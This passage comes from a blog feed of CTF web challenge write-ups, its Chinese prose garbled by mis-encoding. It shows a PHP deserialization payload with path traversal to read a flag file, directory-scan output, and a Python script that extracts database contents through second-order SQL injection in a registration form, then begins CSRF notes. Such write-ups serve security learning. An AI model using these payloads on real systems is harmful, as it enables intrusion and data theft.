</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ€åè¦ç”¨åˆ°çš„æ˜¯è¿™é‡Œ<code>return file_get_contents($file);</code> è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚ç„¶åèƒ½è¿›å…¥è¿™é‡Œçš„æ¡ä»¶æ˜¯<code>$this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova</code> è€Œ<code> $this-&gt;openstack-&gt;neutron = $heat</code> heatæ˜¯è¿™ä¸ªç±»é‡Œæ²¡æœ‰çš„å˜é‡åï¼Œæ‰€ä»¥è¿™ä¸ªçš„å€¼æ˜¯nullé‚£ç°åœ¨å°±è®©<code>$this-&gt;openstack-&gt;nova</code>ä¹Ÿç­‰äºnull<br>é‚£å†å¾€å¤–çœ‹ä¸€å±‚ï¼Œæ‰¾åˆ°è°ƒç”¨<code>echo_name</code>çš„åœ°æ–¹ï¼Œå‘ç°æ˜¯åœ¨acpç±»ä¸­çš„toStringå‡½æ•°ï¼Œè¿™ä¸ªä¼šä¼šåœ¨ä¸‹é¢ç±»å®šä¹‰å®Œä¹‹åçš„<code>echo $logData;</code>ä¼šè°ƒç”¨ï¼Œæ‰€ä»¥ä¼ å…¥çš„ååºåˆ—åŒ–çš„å‚æ•°åº”è¯¥æ˜¯acpç±»<br>æœ€åæœ‰ä¸€ä¸ªå°å¿ƒçš„ç‚¹æ˜¯è¯»æ–‡ä»¶çš„æ—¶å€™<code>$file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</code>è¿™é‡Œå‰é¢æœ‰.&#x2F;æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œæ‰€ä»¥è¦è·¯å¾„ç©¿è¶Š<br>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">acp</span>(<span class="string">&quot;&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>-&gt;neutron = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;nova = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;filename=<span class="string">&#x27;../../../../xmuctfasdasdflag&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =<span class="keyword">new</span> <span class="title function_ invoke__">acp</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªacpç±»ï¼Œä¼ å…¥çš„å‚æ•°æ˜¯ç©ºï¼Œç„¶åè®©å¦å¤–ä¸¤ä¸ªå˜é‡æ˜¯nullï¼Œè¿™æ ·è®©ä¸‹é¢åˆ›å»ºçš„aceç±»bä¸­ä¸¤ä¸ªå€¼éƒ½æ˜¯nullï¼Œè¿›å…¥æ–‡ä»¶è¯»å–ï¼Œç„¶åæœ€åå†åˆ›å»ºä¸€ä¸ªacpç±»ä½œä¸ºä¼ å…¥çš„å‚æ•°ã€‚</p>
<h1 id="unfinish"><a href="#unfinish" class="headerlink" title="unfinish"></a>unfinish</h1><p>é¢˜ç›®ä»‹ç»ï¼šçœ‹åˆ°ç™»é™†æ¡†è¦å¹²å˜›ï¼Ÿ<br>è¿›å…¥é¡µé¢å‘ç°æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”åœ¨çš„ç•Œé¢æ˜¯login.php å°è¯•ç™»å½•ï¼Œå‘ç°é‚®ç®±è¿™å—æœ‰éªŒè¯ï¼Œå¿…é¡»æ˜¯å¸¸è§çš„é‚®ç®±æ ¼å¼<br>ç®€å•æ‰«æä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªæ³¨å†Œç•Œé¢ register.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u http://58.199.64.88:10031/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_58.199.64.88_10031/__25-05-10_11-18-46.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">58.199</span>.<span class="number">64.88</span>:<span class="number">10031</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">46</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">293</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">298</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">297</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">294</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">294</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">294</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">287</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">286</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">292</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">47</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">293</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">48</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">286</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">48</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">287</span>B  <span class="operator">-</span> <span class="symbol">/.php3</span>                                            </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">52</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/config.php</span>                                       </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">54</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">320</span>B  <span class="operator">-</span> <span class="symbol">/fonts</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">58.199</span>.<span class="number">64.88</span>:<span class="number">10031</span><span class="operator">/</span>fonts<span class="symbol">/</span>      </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">54</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">321</span>B  <span class="operator">-</span> <span class="symbol">/images</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">58.199</span>.<span class="number">64.88</span>:<span class="number">10031</span><span class="operator">/</span>images<span class="symbol">/</span>    </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">54</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">289</span>B  <span class="operator">-</span> <span class="operator">/</span>images<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">55</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">661</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">58</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">708</span>B  <span class="operator">-</span> <span class="symbol">/register.php</span>                                     </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">59</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">11</span>:<span class="number">18</span>:<span class="number">59</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">11</span>:<span class="number">19</span>:<span class="number">01</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">322</span>B  <span class="operator">-</span> <span class="symbol">/uploads</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">58.199</span>.<span class="number">64.88</span>:<span class="number">10031</span><span class="operator">/</span>uploads<span class="symbol">/</span>  </span><br><span class="line">[<span class="number">11</span>:<span class="number">19</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">290</span>B  <span class="operator">-</span> <span class="operator">/</span>uploads<span class="symbol">/</span>                                         </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p><img src="https://s3.bmp.ovh/imgs/2025/05/10/4f4d417ec3460a43.png"><br>æ³¨å†Œç•Œé¢å¤šäº†ä¸€ä¸ªusernameå‚æ•°ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œæ¥ç€ç”¨bpè·‘ä¸€ä¸‹è¿‡æ»¤äº†ä»€ä¹ˆä¸œè¥¿ï¼Œè¿™é‡Œæ³¨æ„é‚®ç®±æ¯æ¬¡éƒ½è¦æ¢<br><img src="https://s3.bmp.ovh/imgs/2025/05/10/21492837035a4f68.png"><br>è¿™é‡Œè¦å…ˆé€‰usernameé‡Œé¢åšç¬¬ä¸€ä¸ªæ‰«æä½ç½®ï¼Œç„¶åç¬¬äºŒä¸ªæ‰«æä½ç½®é€‰é‚®ç®±å‰é¢çš„æ•°å­—ï¼Œè¿™æ ·å­çˆ†ç ´çš„æ—¶å€™æ‰ä¼šè®©å‚æ•°å’Œæ•°å­—éƒ½ä¸ä¸€æ ·</p>
<p>å‘ç°è¿‡æ»¤äº†æœ‰ INFORMATION é€—å· %0a<br>æ—¢ç„¶æœ‰ç™»å½•ç•Œé¢ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯äºŒé˜¶æ³¨å…¥ï¼Œåœ¨æˆ‘çš„sqlæ€»ç»“åšå®¢ä¸­ä¹Ÿæœ‰è¯´è¿‡ æˆ‘ä»¬å…ˆåšä¸ªå°è¯•ï¼Œå…ˆè¯•å‡ºæ€ä¹ˆé—­åˆçš„ï¼Œæ‰€ä»¥å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·<br>æ³¨å†Œçš„è´¦å·æ˜¯<code>1&#39; </code>æ— æ³•ç™»å½• å¦‚æœæ˜¯<code>1&#39;&#39;</code>å¯ä»¥ç™»å½•ï¼Œè¯´æ˜ç”¨çš„æ˜¯å•å¼•å·é—­åˆã€‚ç™»å½•åç”¨æˆ·åæ˜¯æœ‰å›æ˜¾çš„<br><img src="https://s3.bmp.ovh/imgs/2025/05/10/f4ad8b26b81d97e3.png"><br>æ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨äºŒé˜¶æ³¨å…¥ï¼Œç®€å•æ¥è¯´å°±æ˜¯æˆ‘ä»¬åœ¨æ³¨å†Œæ—¶ï¼Œç”¨æˆ·åä¸­å¸¦æœ‰sqlå¤„ç†çš„è¯­å¥ï¼Œæ³¨å†Œåä¼šæ‰§è¡Œï¼Œç„¶åå†ç™»å½•å¯ä»¥çœ‹åˆ°ç»“æœ<br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ï¼Œå°±æ˜¯æ³¨é‡Šæ²¡æ³•ç”¨ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨sqlä¸­ä¸­çš„å­—ç¬¦è¿ç®— å¯ä»¥æŠŠæƒ³è¦æ‰§è¡Œçš„è¯­å¥ç”¨asciiè½¬æ¢ç»“æœç„¶åæ‹¼æ¥<br>æ¯”å¦‚æˆ‘åœ¨ç”¨æˆ·åè¾“å…¥<code>0&#39;+ascii(substr(database() from &#123;&#125; for 1))+&#39;0</code><br>åŸæ¥çš„è¯­å¥æ˜¯<code>&#39;$username&#39;</code>è¿™æ ·ï¼Œæ‰€ä»¥ç”¨ç¬¬ä¸€å¼•å·é—­åˆå‰é¢çš„å¼•å·ï¼Œç”¨ç¬¬äºŒå¼•å·é—­åˆåé¢çš„å¼•å·ï¼Œå˜æˆâ€™0â€™ + databaseç¬¬ä¸€ä¸ªå­—ç¬¦ + â€˜0â€™<br>æ³¨å†Œåç™»é™†ï¼Œå‘ç°ç¡®å®æœ‰äº†<br><img src="https://s3.bmp.ovh/imgs/2025/05/10/8d8e17adfa3e620f.png"><br>119 å¯¹åº”çš„å°±æ˜¯w<br><img src="https://s3.bmp.ovh/imgs/2025/05/10/66ec3f3a3d9b572b.png"><br>ä¸‹ä¸€æ­¥å°±å¯ä»¥å†™è„šæœ¬äº†ï¼Œå…ˆæ³¨å†Œï¼Œç„¶åç™»é™†ï¼Œæ‰¾åˆ°usernameçš„å€¼<br>æˆ‘çš„è„šæœ¬æ°´å¹³å¤ªçƒ‚äº†ï¼Œå†™äº†ä¸€ä¸ªå¤§è‡´çš„ï¼Œç„¶åè®©gptä¼˜åŒ–äº†ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url_register = <span class="string">&quot;http://58.199.64.88:10059//register.php&quot;</span></span><br><span class="line">url_login = <span class="string">&quot;http://58.199.64.88:10059//login.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">prev = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://58.199.64.88:10059&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SQL payload ç”¨äº username å­—æ®µ</span></span><br><span class="line">    payload = <span class="string">f&quot;0&#x27;+ascii(substr(database() from <span class="subst">&#123;i&#125;</span> for 1))+&#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line">    email = <span class="string">f&quot;ssss@qq.com<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">    password = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ³¨å†Œè¯·æ±‚</span></span><br><span class="line">    data_register = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    session.post(url_register, headers=headers, data=data_register)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç™»å½•è¯·æ±‚</span></span><br><span class="line">    data_login = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(url_login, headers=headers, data=data_login)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æç™»å½•è¿”å›é¡µé¢ï¼Œæå– &lt;span class=&#x27;user-name&#x27;&gt;ä¸­çš„å†…å®¹</span></span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    name_span = soup.find(<span class="string">&#x27;span&#x27;</span>, class_=<span class="string">&#x27;user-name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name_span:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to find user-name span.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    name_text = name_span.get_text(strip=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name_text != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="built_in">int</span>(name_text))</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;char&#125;</span> -&gt; <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to convert <span class="subst">&#123;name_text&#125;</span> to ASCII char.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è‹¥å­—ç¬¦ä¸å†å˜åŒ–ï¼Œåˆ™è®¤ä¸ºçˆ†ç ´ç»“æŸ</span></span><br><span class="line">    <span class="keyword">if</span> result.strip() == prev.strip():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Database name:&quot;</span>, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°ç»“æœ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line">(base) kakeru@bogon python % python -u <span class="string">&quot;/Users/kakeru/python/tmp.py&quot;</span></span><br><span class="line">[+] <span class="number">1</span>: <span class="function"><span class="title">w</span> -&gt;</span> w</span><br><span class="line">[+] <span class="number">2</span>: <span class="function"><span class="title">e</span> -&gt;</span> we</span><br><span class="line">[+] <span class="number">3</span>: <span class="function"><span class="title">b</span> -&gt;</span> web</span><br><span class="line">[+] Database <span class="keyword">name</span>: web</span><br><span class="line">(base) kakeru@bogon python % </span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥æ•°æ®åº“åå­—æ˜¯web ä½†æ˜¯åˆå¡ä½æˆ‘å¾ˆä¹…ï¼Œå› ä¸ºinformationè¿™ä¸ªè¢«ç¦äº†ï¼Œæ²¡æ³•æŸ¥åˆ°æ•°æ®è¡¨ã€‚ä¸è¿‡ä¹‹å‰æˆ‘é‡åˆ°è¿‡çš„ç±»ä¼¼æƒ…å†µæ˜¯å°±ç®—æœ‰è¡¨ä½†æ˜¯ä¸å¯¹åº”çœŸæ­£æœ‰flagçš„è¡¨<br>è§£å†³æ–¹æ³•æ˜¯ç›´æ¥å°è¯•è¡¨å  å¾ˆå¤šæ—¶å€™flagè¿™ä¸ªå°±æ˜¯è¡¨åï¼Œåœ¨è¿™é¢˜é‡Œå°±æ˜¯è¿™æ ·çš„ã€‚<br>payload ä¿®æ”¹æˆ<code>f&quot;0&#39;+ascii(substr((select * from flag) from &#123;i&#125; for 1))+&#39;0&quot;</code><br>æ³¨æ„é‚®ç®±ä¹Ÿè¦ä¿®æ”¹ä¸€ä¸‹ï¼Œä¸ç„¶å°±é‡å¤æ³¨å†Œäº† è¿è¡Œä¹‹åå¾—åˆ°flag<br><img src="https://s3.bmp.ovh/imgs/2025/05/10/529485ef867d78b6.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRFæ¼æ´å­¦ä¹ ç¬”è®°</title>
    <url>/posts/40609.html</url>
    <content><![CDATA[<p>bpå®éªŒå®¤çš„CSRFæ¼æ´å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>
<h2 id="ä»€ä¹ˆæ˜¯CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´"><a href="#ä»€ä¹ˆæ˜¯CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´" class="headerlink" title="ä»€ä¹ˆæ˜¯CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´"></a>ä»€ä¹ˆæ˜¯CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´</h2><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™æ¼æ´æ¥æ‰§è¡Œä»–ä»¬ä¸è¢«é¢„æœŸçš„å‘½ä»¤ã€‚å®ƒå…è®¸æ”»å‡»è€…éƒ¨åˆ†è§„é¿åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨é˜²æ­¢ä¸åŒç½‘ç«™ç›¸äº’å¹²æ‰°ã€‚</p>
<p>åœ¨æˆåŠŸçš„ CSRF æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´å—å®³ç”¨æˆ·æ— æ„ä¸­æ‰§è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œè¿™å¯èƒ½æ˜¯æ›´æ”¹å…¶å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€ã€æ›´æ”¹å…¶å¯†ç æˆ–è¿›è¡Œèµ„é‡‘è½¬è´¦ã€‚æ ¹æ®æ“ä½œçš„æ€§è´¨ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå®Œå…¨æ§åˆ¶ç”¨æˆ·çš„å¸æˆ·ã€‚å¦‚æœå—æ„ŸæŸ“çš„ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­æ‹¥æœ‰ç‰¹æƒè§’è‰²ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºçš„æ‰€æœ‰æ•°æ®å’ŒåŠŸèƒ½ã€‚</p>
